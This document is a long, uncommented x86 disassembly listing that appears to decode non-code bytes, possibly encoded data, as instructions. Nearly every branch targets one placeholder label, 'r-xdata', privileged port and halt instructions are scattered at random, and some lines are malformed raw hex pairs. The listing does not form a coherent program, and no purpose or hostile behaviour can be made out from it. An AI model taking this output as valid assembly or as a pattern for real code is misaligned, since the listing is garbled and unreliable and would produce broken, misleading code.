outsb
sbb al 0x66
and ebp esp
and bp sp
sti
mov ch 0xb
mov eax [ 0xffffffffba1c1c01 ]
jae r-xdata
or dh [ ecx ]
or eax 0x73731c1c
jae r-xdata
mov al 0xa
unpckhps xmm3 [ esp + ebx ]
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
sbb al 0x60
mov bl 0x68
jae r-xdata
adc bl [ esp + ebx ]
in al dx
jae r-xdata
xchg ecx eax
jae r-xdata
sbb al 0x1c
jae r-xdata
mov edi 0xbdc0abb
jae r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jecxz r-xdata
jae r-xdata
mov al 0xb5
mov [ edi + 0x1c07710a ] esp
sbb al 0x73
jae r-xdata
in al dx
jae r-xdata
jae r-xdata
mov ch 0x89
cmpsd [ esi ] [ edi ]
or dh [ ecx + 0x7 ]
sbb al 0x1c
sbb ecx [ ecx - 0x6f54465 ]
xor ebx [ esp + ebx ]
jae r-xdata
test [ edx - 0x5a ] ebp
adc [ ebx + 0x6a85cd89 ] edi
cmpsb [ esi ] [ edi ]
pop ss
mov ebx 0x15a66a85
mov [ esi - 0x59957a45 ] eax
fisttp [ 0x73731c1c ]
mov esi [ ebx ]
loop r-xdata
jae r-xdata
jae r-xdata
in al dx
nop
and eax 0x1c34c70b
jae r-xdata
push esp
cld
sbb al 0xec
jae r-xdata
or ch [ ecx + 0x12 ]
sbb al 0x1c
jae r-xdata
or dh ah
xor edi [ ebx + 0x1c0c370a ]
push 0xffffffa6
jae r-xdata
outsb
je r-xdata
jae r-xdata
or bl ah
jae r-xdata
jecxz r-xdata
sahf
or ecx [ edx ]
0x731c1c19 0x7373
jae r-xdata
mov sp 0x1c39
jae r-xdata
jae r-xdata
mov [ 0xffffffffc7e76afb ] eax
push 0x20bac7e7
shl [ ebx ] 0x1
jae r-xdata
sbb al 0x73
jae r-xdata
jecxz r-xdata
jecxz r-xdata
daa
jecxz r-xdata
sub [ ecx + ecx * 4 - 0x49957a5f ] edi
jpo r-xdata
push 0xffffff9e
jecxz r-xdata
jae r-xdata
and esi [ ebx - 0x38f4da98 ]
jae r-xdata
push ds
sbb al 0x1c
sbb al 0xb5
sub [ esp + ebx ] ebx
jae r-xdata
mov ebp 0x550a2366
sbb al 0x73
jae r-xdata
jecxz r-xdata
jecxz r-xdata
sub bx [ esi ]
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
push 0xe26aefae
jae r-xdata
jae r-xdata
and al 0xa6
pop edx
shl ebx cl
jecxz r-xdata
or cl [ ecx ]
nop [ esi * 4 + 0xabbbf89 ] ebx
jecxz r-xdata
or ebx [ esp + ebx ]
jae r-xdata
jae r-xdata
or dh dl
add al 0x1c
jae r-xdata
mov [ 0x1c0af70a ] eax
jae r-xdata
jecxz r-xdata
jae r-xdata
shl [ ebx ] 0x1
mov [ edi + 0x41b66a85 ] edx
or ebp [ ebx ]
cmp ebx [ esp + ebx ]
jecxz r-xdata
or cl [ ecx + 0x73e3e3ea ]
mov ebx esp
jae r-xdata
push 0x34c70b25
jae r-xdata
or cl [ edi ]
jae r-xdata
jae r-xdata
cmp [ eax - 0x1c9c8ae4 ] dh
jecxz r-xdata
in al 0xe3
sbb al 0x97
sbb al 0x60
jae r-xdata
sbb al 0x1c
mov bl 0x1c
push ds
jae r-xdata
sbb al 0x1c
pushad
in al dx
push 0xa2cc811
jae r-xdata
mov bl 0x68
cmpsb [ esi ] [ edi ]
sbb ebp [ eax + 0x63 ]
inc edi
jecxz r-xdata
mov edx 0xd81fa66a
and ah ch
jecxz r-xdata
push 0xe085cda0
cmpsd [ esi ] [ edi ]
loop r-xdata
jae r-xdata
mov al 0xa
out dx eax
jae r-xdata
sbb al 0x73
jae r-xdata
or dh [ edi ]
or al 0x1c
mov ebx 0x1c33f30a
sbb al 0x73
jae r-xdata
jb r-xdata
xchg [ eax - 0x1e ] ebp
push 0xa368efa3
out dx eax
jecxz r-xdata
sbb al 0x73
jae r-xdata
sbb al 0x74
arpl bx sp
mov esi 0x11390a37
sbb al 0x1c
cmp [ esp + ebx ] ebx
mov [ eax - 0x5441957b ] eax
mov eax 0xa9be6a85
push 0xbe6a853b
scasd [ edi ]
push 0xbe6a853a
lodsd [ esi ]
push 0x3810a3c
sbb al 0x1c
jae r-xdata
test [ edx ] 0x73731c1c
jae r-xdata
pushad
daa
out dx eax
or eax [ eax - 0x5 ]
jecxz r-xdata
mov ebx esp
mov ch 0xb
sub edi [ ebx ]
sbb al 0x1c
test [ edx - 0x62 ] ebp

fsub [ esp + ebp * 8 ]
cmp bl [ esp + ebx ]
aaa
sbb al 0x75
dec edi
jae r-xdata
xor al 0x1c
or eax edi
jae r-xdata
adc eax 0x73731c1c
jae r-xdata
jae r-xdata
or bl bh
or eax 0x73731c1c
add bl [ esp + ebx ]
sbb al 0x96
daa
jae r-xdata
sbb al 0xb3
jae r-xdata
enter 0xa2c 0xfe
jecxz r-xdata
jae r-xdata
push 0xffffffbe
aaa
or bh [ ecx ]
adc [ esp + ebx ] ebx
jecxz r-xdata
pushfd
jmp r-xdata
aaa
push 0xffffffa6
sbb al 0x1c
jae r-xdata
loop r-xdata
jae r-xdata
hlt
jae r-xdata
mov edx 0x73737320
or dh [ edx + 0x2f ]
sbb al 0x73
test [ edx - 0x5a ] ebp
pop ss
mov ebx 0x1c2f720a
sbb al 0x73
in al dx
add al 0x1c
test [ edx - 0x5a ] ebp
jae r-xdata
or [ edi ] ecx
jae r-xdata
push 0xe76afba3
jae r-xdata
sbb al 0x1c
sbb al 0x1c
jae r-xdata
popad
push ss
jae r-xdata
sbb al 0x73
jae r-xdata
sub [ esp + ebx ] ebx
jae r-xdata
mov ah 0x1c
mov ch 0xeb
sbb al 0x1c
jae r-xdata
jae r-xdata
push 0xef0f600f
jae r-xdata
sbb al 0x1c
jae r-xdata
or ch [ edi + edx ]
sbb al 0xb5
xchg [ eax + 0x2b ] esp
loope r-xdata
jae r-xdata
jae r-xdata
and ebp ebx
mov bl 0x1c
xchg esi eax
pop es
push 0xffffffbe
aas
sbb al 0xb4
sti
mov ah 0xb
pushad
sbb bl [ ebx + esi ]
or bl [ ebx + ebp * 8 + 0x7373e3e3 ]
mov al 0xb0
mov al 0x25
cmpsb [ esi ] [ edi ]
cvtdq2ps xmm4 [ esi ]
jae r-xdata
sbb al 0x1c
jae r-xdata
or ah [ edx + 0x731c1c02 ]
jae r-xdata
jecxz r-xdata
jae r-xdata
or dl [ ebx + 0x12 ]
sbb al 0x1c
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
sbb al 0x1c
jae r-xdata
or ch [ edx + 0x13 ]
sbb al 0x1c
jae r-xdata
and esp [ ebx + 0x1c0af70a ]
scasb [ di ]
sbb al 0x73
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
test eax 0x6ee3e3e7
mov dh 0xb
or ah [ esi + 0x731c1c2f ]
sbb al 0x73
jae r-xdata
mov ch 0xeb
jae r-xdata
jae r-xdata
jae r-xdata
and al 0x1c
jae r-xdata
add al 0x1c
sbb al 0xb5
push 0x6012c813
and ah cl
nop
push 0xffffffa6
sbb ebp [ esi - 0x5a ]
or ah [ bx + si + 0xb ]
sbb al 0x1c
jae r-xdata
sbb al 0x6e
jae r-xdata
jae r-xdata
or dh [ esi - 0x76e3e3fc ]
mul [ bx ]
sbb al 0x1c
or al [ ebx + 0x6ae3e3e7 ]
cmpsb [ esi ] [ edi ]
pop ds
shl [ ebx ] 0x1
fisub [ esi + 0x25c80a1f ]
sbb al 0x1c
push 0xffffffa6
pop ds
fsub [ eax ]
in al dx
adc bl [ esp + ebx ]
mov edi esp
outsb
mov ebx 0x1c0c370a
jae r-xdata
mov ch 0x89
jae r-xdata
jae r-xdata
jae r-xdata
mov ch 0x68
adc ah [ esi + 0x15 ]
in al dx
adc edx [ bx ]
movsb [ edi ] [ esi ]
in al dx
or ebp [ ecx + 0x6ee3e3e7 ]
jae r-xdata
jae r-xdata
rcr [ edx + ecx ] 0x1
jae r-xdata
out 0xe3 eax
jae r-xdata
jae r-xdata
sbb al 0xa
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
push 0xfba368e3
push 0xffffffe7
or dh bl
xor ebx [ esp + ebx ]
jae r-xdata
jae r-xdata
jae r-xdata
jmp r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
or bh [ ebx ]
add bl [ esp + ebx ]
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
mov [ 0x731c1c02 ] al
jae r-xdata
pushad
lahf
mov al 0xb4
mov dh 0x68
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
test [ edx - 0x5a ] ebp
jae r-xdata
jae r-xdata
mov bl 0x87
sbb al 0x96
push 0x13e0df93
jae r-xdata
cmp eax [ edx ]
sbb al 0x1c
nop
imul edx [ ebx - 0x1d ] 0xffffffe3
jecxz r-xdata
imul ebp [ esi + 0x17130aef ] 0x73731c1c
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
punpcklbw mmx1 [ edi ]
out dx eax
jae r-xdata
or bh [ esi + 0x2f ]
sbb al 0x1c
jae r-xdata
outsb
jae r-xdata
jae r-xdata
add [ esp + ebx ] bl
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
or ah [ ecx - 0x18 ]
jecxz r-xdata
push 0x68301c12
and eax 0x1c16aa0a
fnstsw ax
jae r-xdata
dec esp
jae r-xdata
jae r-xdata
push ds
outsd
je r-xdata
jae r-xdata
jae r-xdata
pxor mm6 [ eax - 0x1f5df54c ]
jecxz r-xdata
jae r-xdata
or ecx [ edx ]
cmpsb [ esi ] [ edi ]
das
sbb al 0x1c
jae r-xdata
sbb al 0x74
jae r-xdata
sbb al 0x73
jae r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
outsb
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
sbb al 0x73
jae r-xdata
or ch [ ebp + 0x1ce3e3e5 ]
adc esp [ edx - 0x23 ]
jae r-xdata
outsb
cmpsb [ esi ] [ edi ]
jae r-xdata
or cl [ ecx + ebp + 0x1c ]
jecxz r-xdata
jae r-xdata
jae r-xdata
mov ch 0x87
pushad
sub esp ecx
mov bl 0xa
sub al 0x17
cmpsb [ esi ] [ edi ]
sbb esi [ ebx - 0x1df4da98 ]
mov edx 0x66ec2366
push 0x6e1c1c37
jae r-xdata
or ah [ eax + esi * 8 + 0x7373e3e3 ]
jae r-xdata
or esp edx
mov bl 0x24
jae r-xdata
scasb [ edi ]
jae r-xdata
adc cl [ ecx + 0x24e389e3 ]
cmpsb [ esi ] [ edi ]
push ss
mov ebx esp
mov ebx esp
test [ esi ] esp
and eax 0x245b0fa6
cmpsb [ esi ] [ edi ]
shl [ ebx ] 0x1
mov [ edx + ebp * 2 ] ebx
sahf
pop ds
sbb al 0x75
outsd
jecxz r-xdata
mov esp edi
out dx eax
jae r-xdata
adc eax 0x190a1c1c
dec edi
jae r-xdata
jae r-xdata
test al 0xe3
jae r-xdata
dec di
mov al 0x6e
jae r-xdata
jae r-xdata
jae r-xdata
loop r-xdata
jae r-xdata
scasb [ edi ]
out dx eax
or dl [ ebx ]
pop ss
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
pop ss
or al dh
out 0xe3 al
jecxz r-xdata
jae r-xdata
and eax 0x1c24e20b
jecxz r-xdata
jae r-xdata
or ah [ edx - 0x451c1c20 ]
and bp sp
push 0x1c37
sbb al 0x6e
mov bl 0xb0
sbb al 0xb5
cmpsd [ esi ] [ edi ]
push 0xae681fa6
jecxz r-xdata
jae r-xdata
push 0xffffffe2
jae r-xdata
jae r-xdata
mov al 0x89
jecxz r-xdata
jae r-xdata
xor ebx [ esp + ebx ]
sbb al 0x1c
jae r-xdata
jae r-xdata
pop ebx
scasb [ edi ]
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
popad
mov edi 0x89e3e3ee
jecxz r-xdata
pop ds
shr [ edx ] 0x1
pushad
sbb ebx [ esp + ebp * 8 ]
jbe r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
jecxz r-xdata
mov ch 0xb5
imul esi ebx 0xe3e66d0a
jae r-xdata
jae r-xdata
jae r-xdata
and al 0xe3
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
out dx eax
mov [ esi + 0x2da66a85 ] edx
test [ edx - 0x5a ] ebp
xor ecx [ edx ]
pop ecx
cmp ebx [ esp + ebx ]
mov ebx esp
sbb al 0xb3
scasd [ edi ]
jae r-xdata
movsd [ edi ] [ esi ]
xlat
mov bl 0xa
sub al 0x16
sbb al 0x1c
jae r-xdata
mov edi esp
outsb
jae r-xdata
0xaa0ae3e3 0xe3f0
sub ebp [ ecx - 0xd ]
jae r-xdata
jae r-xdata
fsubrp st3
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
insd
out 0xe3 eax
jecxz r-xdata
or [ esp + ebx ] bl
sbb al 0x96
jae r-xdata
jae r-xdata
xchg edi eax
sbb al 0xba
mov edx 0x7373202a
jae r-xdata
or ch [ ebp - 0x1a ]
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
push 0xffffffaf
add ebp [ edx - 0x5a ]
xchg esi eax
jae r-xdata
push ebx
jae r-xdata
test [ edx ] 0x1c1c0f60
jae r-xdata
jae r-xdata
or esp ebx
jmp r-xdata
sbb ecx [ ebx - 0x7c0da6d2 ]
mov ah 0x6a
pop ebp
aaa
jecxz r-xdata
jae r-xdata
mov bl 0xb3
jecxz r-xdata
out 0x8b eax
jecxz r-xdata
retn
sahf
rol [ esi + 0x53 ] cl
mov ah 0x6a
movsd [ edi ] [ esi ]
out dx eax
or ch [ ebx ]
cmp [ esp + ebx ] ebx
jae r-xdata
jecxz r-xdata
or ch [ ebp - 0x1a ]
jae r-xdata
mov [ ebp - 0x59957b ] ecx
or bh [ edi - 0x16 ]
mov ah 0x66
sub ch ah
jecxz r-xdata
out 0xe3 al
push 0x22e0dfa2
in al dx
mov ecx 0xda85e3e3
jae r-xdata
or eax esp
sbb al 0xa
sbb [ ebx ] esi
sbb al 0x1c
enter 0x692b 0xf3
jae r-xdata
jg r-xdata
jae r-xdata
out dx eax
sbb al 0x1c
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
test [ edx - 0x5a ] ebp
jae r-xdata
mov bl 0xa6
jecxz r-xdata
jae r-xdata
jae r-xdata
loop r-xdata
jae r-xdata
arpl bx sp
jae r-xdata
cmpsb [ esi ] [ edi ]
aas
out 0x6e eax
push 0xb66a8532
nop [ ecx + edi * 4 ] ebx
test [ edx - 0x4a ] ebp
jae r-xdata
pushad
jae r-xdata
jae r-xdata
add eax edx
xor [ ecx - 0x49957a73 ] ecx
push 0xffffffb6
or esi esp
in al 0xe3
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
loop r-xdata
jecxz r-xdata
jecxz r-xdata
pop es
sbb al 0x1c
add bh [ esi ]
mov edx 0x73202aba
jae r-xdata
test al 0xe3
mov ch 0xb4
sub ch ah
insd
jae r-xdata
fsub [ eax ]
or ch [ edx + 0x73e3e3f0 ]
jae r-xdata
or cl al
xor bl [ esp + ebx ]
shr [ 0x6aba1c1c ] 0x1
jae r-xdata
sbb al 0x1c
jecxz r-xdata
jae r-xdata
xchg esi eax
jae r-xdata
mov dh 0x1b
push 0xe60a1fa6
jae r-xdata
or [ edx ] ecx
cmpsb [ esi ] [ edi ]
jae r-xdata
mov ecx [ esi ]
jae r-xdata
jecxz r-xdata
jae r-xdata
out dx al
jecxz r-xdata
mov ecx 0x1b66a85
sbb al 0x1c
jae r-xdata
jae r-xdata
pop ebx
push 0xef900a33
jecxz r-xdata
sub esp ebx
jecxz r-xdata
movsb [ edi ] [ esi ]
cmp [ esp + ebx ] bl
jae r-xdata
scasb [ edi ]
or [ esp + ebx ] bl
mov bl 0xb0
jae r-xdata
jae r-xdata
adc [ esp + ebx ] ebx
jae r-xdata
or dl [ esi ]
mov [ 0x1f86609b ] eax
jecxz r-xdata
sbb al 0x1c
mov bl 0x6e
push di
sbb ebx [ esp + ebx ]
mov bl 0xa
push ss
sub ebx [ esi ]
or bh [ edx + 0x73e3e3e8 ]
jae r-xdata
and bp sp
jae r-xdata
push 0xffffffa6
jecxz r-xdata
jae r-xdata
mov ebx 0xc39368c7
jae r-xdata
and cx [ edx ]
sbb esp edx
push 0xb31ceba6
jae r-xdata
out 0x6e eax
sbb al 0x1c
arpl [ esi + 0x66ece2f3 ] bx
add bh [ esi ]
jae r-xdata
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
pop es
test [ edx - 0x4a ] ebp
jecxz r-xdata
pop esp
sbb al 0x1c
jae r-xdata
das
jae r-xdata
loop r-xdata
sbb al 0x1c
outsb
in al 0xe3
jecxz r-xdata
or ebp edi
sbb al 0x1c
mov al 0x89
jae r-xdata
jae r-xdata
jecxz r-xdata
and ch [ eax - 0x65 ]
[ eax - 0x45 ]
mov al 0x1c
jae r-xdata
mov eax 0xa1c1c00
and eax 0x731c1c2b
jae r-xdata
in al dx
jecxz r-xdata
jecxz r-xdata
lea edx [ esi ]
sbb al 0x1c
jae r-xdata
and ecx [ edx ]
loop r-xdata
loopne r-xdata
push 0xa368c393
jae r-xdata
jecxz r-xdata
lea eax [ ebp + 0xaffa66a ]
sbb al 0x1c
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
jae r-xdata
jecxz r-xdata
les ecx [ 0x27601c1c ]
cmpsb [ esi ] [ edi ]
jae r-xdata
jecxz r-xdata
jae r-xdata
jecxz r-xdata
mov ecx 0x661c1c01
and ebp esp
out 0xe3 eax
jecxz r-xdata
shl [ ecx ] 0x1
mov dh 0x1
jecxz r-xdata
rcr [ esp ] 0x1
and bp sp
out dx al
aam 0x3f
sbb al 0x1c
push 0x236033a6
fcom [ ebx ]
or ah [ ecx - 0x1b ]
sbb al 0x89
jecxz r-xdata
or dh [ ebp - 0xe ]
jecxz r-xdata
or eax 0xa46e1c1c
jae r-xdata
retn
jae r-xdata
sbb al 0x96
or ebx [ esp + esi * 2 ]
jcxz r-xdata
loop r-xdata
shl ebx 0x1
jecxz r-xdata
mov [ 0xffffffffec22e0df ] al
hlt
jae r-xdata
mov al 0x6e
sub bx [ esi ]
sbb al 0x1c
jae r-xdata
push 0xffffffa6
sbb al 0x1c
loopne r-xdata
retn
jae r-xdata
jae r-xdata
mov ebx esp
or ch [ ebp - 0x19 ]
jecxz r-xdata
mov edx 0xffc7a76a
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
mov eax [ esi + 0x5a ]
jecxz r-xdata
sbb al 0xb4
jae r-xdata
jae r-xdata
sbb al 0x96
lahf
push 0xffffff9f
sbb al 0xb
mov edx [ esi ]
sbb al 0x1c
push 0xaa68ebae
fild [ eax - 0x4b ]
mov bl 0xa
insb
or ecx [ ebx + 0x681c1c16 ]
scasb [ edi ]
mov bl 0xaf
jae r-xdata
movsb [ edi ] [ esi ]
sbb al 0x6e
sbb al 0xb4
mov al 0xa
jae r-xdata
mov edx [ eax ]
xchg edi eax
xchg [ eax + 0x38a40ab4 ] dh
sbb al 0x1c
jecxz r-xdata
xor [ esp + ebx ] edx
rcr [ esp + esi * 4 ] 0x1
mov ah 0xa
movsd [ edi ] [ esi ]
cmp ebx [ esp + ebx ]
jae r-xdata
or bl [ ecx ]
pop edi
add eax 0x6eb01c1c
sbb esp [ esi + 0x23 ]
in al dx
outsb
das
sbb al 0x1c
shl [ ebx ] 0x1
mov esp 0x202ab8bd
mov [ 0xffffffffe01ae0fb ] eax
jae r-xdata
cmpsd [ esi ] [ edi ]
or edx ecx
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
xchg [ esi + edx * 4 ] ebx
sbb al 0xb3
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sti
push 0x65
pop ss
jecxz r-xdata
sbb al 0x60
daa
jecxz r-xdata
div [ si - 0xff5 ]
or eax 0xbaba1c1c
and bp sp
jmp r-xdata
inc esi
pop edx
mov bh 0xa
jae r-xdata
jae r-xdata
sbb al 0x75
add esp ebx
jecxz r-xdata
sbb al 0x96
pop ds
sbb al 0x96
pop es
sbb al 0x33
or cl cl
cmp bl [ esp + ebx ]
jae r-xdata
mov [ ebp + 0x7b66a85 ] ecx
cmp esp ebx
jecxz r-xdata
xchg esi eax
jae r-xdata
push edx
sbb bl [ esp + ebx ]
jae r-xdata
mov ebp [ esi ]
pop ecx
xor [ edx + ebp * 2 - 0x1c1cc8a3 ] 0xffffffe3
or ebp [ esi - 0x74e3e3f8 ]
adc [ edi + 0xab4b086 ] dl
and ebp [ edx - 0x42 ]
add ebp [ edx - 0x42 ]
pop ss
test eax ebx
movsd [ edi ] [ esi ]
in eax 0xec
pushad
jmp r-xdata
jae r-xdata
loopne r-xdata
jae r-xdata
sub eax 0x6aba1c1c
jae r-xdata
jae r-xdata
jae r-xdata
popad
call 0x73ba3222
nop [ ebx + esi * 2 ] ebx
jae r-xdata
push 0xffffffb6
sbb ebp [ eax - 0x5a ]
pop ds
or ah dh
xchg ebx eax
jae r-xdata
sbb al 0x73
mov al [ 0x2366bad7 ]
in al dx
shl ebp 0x1
or eax 0x1b656ab0
jecxz r-xdata
push cs
mov bl 0x68
and eax 0x1c12d80b
adc bh dh
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0xb5
scasd [ edi ]
or cl bh
sub [ esp + ebx ] ebx
jae r-xdata
sbb ebp [ eax + 0x3d ]
test [ edx - 0x42 ] ebp
jae r-xdata
mov al 0xb0
mov ebx eax
mov al 0xb0
or dl [ edx + 0x1a ]
sbb al 0x1c
sbb al 0x73
jae r-xdata
outsb
cmpsd [ esi ] [ edi ]
mov [ 0x27c60a1d ] al
sbb al 0x1c
jae r-xdata
sbb al 0x1c
jae r-xdata
mov dh 0x7
sbb [ eax + 0x3b ] ebp
test [ edx - 0x42 ] ebp
pop ds
or ah [ ebx ]
aaa
sbb al 0x1c
jae r-xdata
test [ edx - 0x42 ] ebp
adc ecx [ ecx + 0x6a85b896 ]
mov esi 0xb88a8911
test [ edx - 0x42 ] ebp
pop ss
push 0xbe6a853c
adc eax 0x6a853b68
mov esi 0x853d681b
push 0xffffffbe
cmp ah al
push 0xffffffa6
add [ ebx + 0x6a85c189 ] edi
cmpsb [ esi ] [ edi ]
pop es
or bl ch
sbb ebx [ esp + ebx ]
jae r-xdata
jae r-xdata
sbb al 0xba
jae r-xdata
jecxz r-xdata
pushad
and [ edx ] cl
enter 0x1c32 0x1c
jae r-xdata
loopne r-xdata
mov bl 0x1c
mov ch 0xeb
pushad
cwde
mov [ 0xffffffffcb67ece3 ] eax
jecxz r-xdata
jecxz r-xdata
push 0x36d40b1d
sbb al 0x1c
pushad
daa
out dx eax
fiadd [ ebx - 0x131c1cf7 ]
in eax 0xe3
jecxz r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
or bl [ esp + ebx ]
jae r-xdata
sbb al 0xba
and bp sp
sub [ es : esp + ebx ] bl
and ch ah
push ebx
pop ebp
sbb al 0x1c
or al [ ebx ]
sbb al 0x1c
jae r-xdata
jecxz r-xdata
shl [ ebx ] 0x1
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
push 0xffffffa7
jae r-xdata
jae r-xdata
stosb [ edi ]
in al dx
cmpsd [ esi ] [ edi ]
out 0xe3 eax
daa
sbb bl [ esp + ebx ]
push 0x66bad7a0
and ebp esp
jecxz r-xdata
mov ah [ ebx - 0x1cd8aae4 ]
jecxz r-xdata
mov [ 0xffffffffd0ebb51c ] eax
sbb al 0xa
sbb al 0x90
outsb
jae r-xdata
jae r-xdata
and bp sp
inc eax
adc [ esp + ebx ] bl
sbb al 0x1c
mov ch 0xaf
jecxz r-xdata
xlat
sbb al 0x6a
jae r-xdata
or al [ ebx + 0xb ]
sbb al 0x1c
in al dx
push esp
test [ edx - 0xd ] ebp
test [ esi + 0x31 ] esp
or ah dh
sbb [ esp + ebx ] ebx
jae r-xdata
or ah [ ecx + 0x36 ]
sbb al 0x1c
out dx eax
jecxz r-xdata
mov edi 0xc7a76ee3
jae r-xdata
jae r-xdata
jae r-xdata
xchg [ 0x73731c1c ] dl
jae r-xdata
push 0xffffffa5
jae r-xdata
push 0x1ae0fba3
jae r-xdata
loope r-xdata
jae r-xdata
mov ah 0xb7
jae r-xdata
jae r-xdata
iretd
movsd [ edi ] [ esi ]
outsb
sub bx [ esi ]
sbb al 0x1c
mov bl 0xb0
mov al 0x89
stc
mov al 0x1c
jne r-xdata
jae r-xdata
jecxz r-xdata
pushad
daa
out dx eax
pushad
xchg edi eax
jae r-xdata
push 0xffffffae
pushad
jecxz r-xdata
sbb al 0x75
arpl bx sp
jecxz r-xdata
mov ebp 0x73202ab8
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sti
jae r-xdata
jecxz r-xdata
sbb al 0x1c
jae r-xdata
or dh [ ebx + 0x37 ]
jae r-xdata
mov eax [ ecx + 0x45 ]
or [ eax ] 0xb4
or eax [ ebx - 0x74e3e3f6 ]
lodsb [ ss : esi ]
xchg ecx eax
sub [ esp + ebx ] ebx
or eax [ edi + esi ]
adc esi [ edx + ecx + 0x1c1c5d3a ]
jae r-xdata
xchg esi eax
sbb eax 0x73731c1c
jae r-xdata
mov ah 0xb4
mov al 0xa
mov [ edx ] ss
sbb al 0x1c
jae r-xdata
sub al 0x1c
pushfd
jae r-xdata
cmpsd [ esi ] [ edi ]
mov edi 0x1c39070a
sbb al 0x73
jae r-xdata
mov ah 0x6a
movsd [ edi ] [ esi ]
fisttp [ edx ]
or al [ ebx + 0x8 ]
sbb al 0x1c
sub ah [ eax ]
jae r-xdata
jae r-xdata
jae r-xdata
and edi [ ebp + 0x73202ab8 ]
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0xa7
sbb ah al
jae r-xdata
or ah [ ebp + 0x1ce3e3e3 ]
jae r-xdata
aaa
jae r-xdata
0x7373e3e3 0xb073
mov dl 0x1c
xchg ebx eax
pop ds
push 0xebaee0eb
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
test [ edx - 0x5a ] ebp
jae r-xdata
jae r-xdata
xchg edi eax
jae r-xdata
sbb al 0x1c
and bp sp
xchg esi eax
aaa
and esp ebx
mov eax 0x7373202a
jae r-xdata
jae r-xdata
out 0xe3 eax
in al dx
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
outsw
sbb al 0x6e
jae r-xdata
jae r-xdata
push 0xffffffa6
jmp r-xdata
jae r-xdata
shr [ edx ] 0x1
and bp sp
jpe r-xdata
and ebp esp
outsb
sbb [ si ] bl
adc eax 0xa66a85bb
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
jae r-xdata
outsb
outsb
sbb ebx [ esi ]
sbb al 0x1c
or bh [ esp + edi ]
sbb al 0x1c
jae r-xdata
and [ ebx + 0x73 ] dh
loopne r-xdata
jae r-xdata
push 0x65878b3b
adc [ esi - 0x5442954c ] dl
or ecx [ ebp + 0x6a1c1c0a ]
adc ch [ edx - 0x5a ]
mov ah 0x6a
movsd [ edi ] [ esi ]
jecxz r-xdata
jae r-xdata
jae r-xdata
add [ ebx ] edi
sti
jae r-xdata
sbb al 0x1c
scasb [ edi ]
jmp r-xdata
jae r-xdata
jmp r-xdata
or bl [ edx - 0x7ae3e3cd ]
push 0xffffffa6
mov ebx 0x1ba66a85
shl [ ebx ] 0x1
test [ edx - 0x5a ] ebp
jae r-xdata
jae r-xdata
jae r-xdata
jne r-xdata
in al dx
push esp
mov al 0x60
and ah cl
mov ah 0x68
sbb [ edx ] ecx
or ebx [ ebp + 0x1c ]
sbb al 0x73
jae r-xdata
cmp [ esp + ebx ] ebp
jecxz r-xdata
and esp ebx
jae r-xdata
xchg edi eax
jae r-xdata
jne r-xdata
jae r-xdata
mov ch 0x68
jae r-xdata
xor ebx [ esi ]
cmpsb [ esi ] [ edi ]
sbb esi [ ebx + 0x1c1d050a ]
sbb al 0x73
jae r-xdata
mov [ eax + 0x1c2b140a ] edx
sbb al 0x73
jae r-xdata
or al [ ecx ]
jae r-xdata
push 0x2f730a1b
sbb edx eax
and eax [ ebp - 0x74e65996 ]
out 0xe2 eax
jecxz r-xdata
push 0xffffffa6
sbb al 0x74
jae r-xdata
sbb al 0x1c
jae r-xdata
jecxz r-xdata
jae r-xdata
outsb
cmpsb [ esi ] [ edi ]
inc ebx
mov bl 0x68
and eax 0x1c31340a
sbb al 0x73
mov dl 0xb0
mov ch 0xa
inc ebx
or ebx [ esp + ebx ]
push 0x223a0b25
sbb al 0x1c
mov edx 0x66ec2366
sub [ es : esp + ebx ] bl
sbb al 0xa
jae r-xdata
mov esp edi
loop r-xdata
jecxz r-xdata
push 0x202aeba6
jae r-xdata
jae r-xdata
jecxz r-xdata
jecxz r-xdata
and al 0xa
jae r-xdata
xchg ebp eax
jae r-xdata
mov al 0xb5
jae r-xdata
cmp ebx [ esp + ebx ]
jae r-xdata
sbb al 0x95
arpl bx sp
jae r-xdata
sbb al 0xb3
push 0xb31ceba6
sbb [ si ] bl
jae r-xdata
jae r-xdata
jae r-xdata
shl [ edx + ebp * 2 + 0x390adba5 ] 0x2c
sbb al 0x1c
